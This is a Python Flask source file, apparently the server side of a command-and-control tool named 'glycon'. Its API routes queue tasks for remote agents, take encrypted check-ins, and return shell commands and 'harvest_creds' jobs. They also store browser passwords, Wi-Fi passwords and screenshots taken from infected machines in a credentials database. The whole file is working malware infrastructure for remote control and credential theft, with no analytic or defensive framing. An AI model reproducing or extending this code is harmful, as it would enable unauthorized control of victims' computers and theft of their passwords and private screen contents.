from flask import jsonify, request, Response
from flask_login import login_required
from glycon.secure_comms import SecureComms
from glycon.config import CONFIG
from datetime import datetime
import sqlite3
import traceback
import json
import base64

def init_api_routes(app, socketio):
    @app.route('/api/task', methods=['POST'])
    @login_required
    def create_task():
        try:
            if request.content_type != 'application/json':
                return jsonify({
                    "status": "error", 
                    "message": "Content-Type must be application/json"
                }), 415

            data = request.get_json()
            if not data:
                return jsonify({
                    "status": "error", 
                    "message": "No JSON data provided"
                }), 400
            
            required_fields = ['agent_id', 'task_type']
            if not all(field in data for field in required_fields):
                return jsonify({
                    "status": "error", 
                    "message": f"Missing required fields: {required_fields}"
                }), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (None, 
                      data['agent_id'], 
                      data['task_type'], 
                      json.dumps(data.get('task_data', {})),
                      'pending', 
                      datetime.now().isoformat(), 
                      None))
            
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            socketio.emit('new_task', {
                'task_id': task_id,
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({
                "status": "success", 
                "task_id": task_id
            })

        except Exception as e:
            return jsonify({
                "status": "error", 
                "message": str(e)
            }), 500

    @app.route('/api/checkin', methods=['POST'])
    def agent_checkin():
        conn = None
        try:
            if not request.data:
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            try:
                data = SecureComms.decrypt(request.data)
            except Exception as e:
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            conn = sqlite3.connect(CONFIG.database)
            conn.execute("PRAGMA journal_mode=WAL")
            c = conn.cursor()

            c.execute('''INSERT OR REPLACE INTO agents 
                        VALUES (?, ?, ?, ?, ?, ?, ?)''',
                     (data['agent_id'],
                      data.get('hostname', 'UNKNOWN'),
                      data.get('ip', '0.0.0.0'),
                      data.get('os', 'UNKNOWN'),
                      datetime.now().isoformat(),
                      'online',
                      data.get('privilege', 'user')))

            if 'credentials' in data:
                creds = data['credentials']
                for cred in creds.get('browsers', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  cred.get('browser', 'unknown'),
                                  cred.get('url', ''),
                                  cred.get('username', ''),
                                  cred.get('password', ''),
                                  datetime.now().isoformat()))
                    except Exception as e:
                        pass

                for wifi in creds.get('wifi', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  'wifi',
                                  '',
                                  wifi.get('ssid', ''),
                                  wifi.get('password', ''),
                                  datetime.now().isoformat()))
                    except Exception as e:
                        pass

            if 'screenshot' in data:
                try:
                    if isinstance(data['screenshot'], str):
                        image_data = base64.b64decode(data['screenshot'])
                    else:
                        image_data = data['screenshot']
                    
                    if len(image_data) > 10 * 1024 * 1024:
                        raise ValueError("Screenshot too large")
                    
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              image_data,
                              datetime.now().isoformat()))
                except Exception as e:
                    pass

            c.execute('''SELECT id, task_type, task_data FROM tasks 
                         WHERE agent_id=? AND status='pending'
                         ORDER BY created_at LIMIT 1''',
                     (data['agent_id'],))
            task = c.fetchone()

            if task:
                c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
                response = {
                    'task_id': task[0],
                    'type': task[1],
                    'data': json.loads(task[2])
                }
            else:
                response = {'type': 'noop'}

            conn.commit()
            conn.close()

            encrypted_response = SecureComms.encrypt(response)
            return Response(encrypted_response,
                          mimetype='application/octet-stream')

        except Exception as e:
            if conn:
                conn.rollback()
                conn.close()
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

    @app.route('/api/task_result', methods=['POST'])
    def task_result():
        conn = None
        try:
            data = SecureComms.decrypt(request.data)
            
            conn = sqlite3.connect(CONFIG.database)
            conn.execute("PRAGMA journal_mode=WAL")
            c = conn.cursor()
            
            c.execute('''UPDATE tasks SET status='completed', completed_at=?
                         WHERE id=?''', (datetime.now().isoformat(), data['task_id']))
            
            c.execute("SELECT task_type, task_data FROM tasks WHERE id=?", (data['task_id'],))
            task = c.fetchone()
            if task:
                task_type = task[0]
                task_data = json.loads(task[1])
                
                if task_type == 'shell' and task_data.get('terminal', False):
                    # Add sequence ID to prevent duplicates
                    socketio.emit('terminal_output', {
                        'agent_id': data['agent_id'],
                        'command': task_data.get('cmd', ''),
                        'output': data['result'].get('output', 'No output'),
                        'error': data['result'].get('error', ''),
                        'task_id': data['task_id'],
                        'seq_id': task_data.get('seq_id', 0)
                    }, room=f"terminal_{data['agent_id']}")
            
            if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
                try:
                    image_data = base64.b64decode(data['result']['screenshot'])
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'], 
                              image_data,
                              datetime.now().isoformat()))
                except Exception as e:
                    pass
            
            if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
                for cred in data['result']['credentials']:
                    try:
                        c.execute('''INSERT INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'], cred.get('browser', ''), 
                                  cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
                                  datetime.now().isoformat()))
                    except Exception as e:
                        pass
            
            conn.commit()
            conn.close()
            
            socketio.emit('task_complete', {
                'task_id': data['task_id'],
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({'status': 'success'})
        
        except Exception as e:
            if conn:
                conn.rollback()
                conn.close()
            return jsonify({'status': 'error', 'message': str(e)}), 500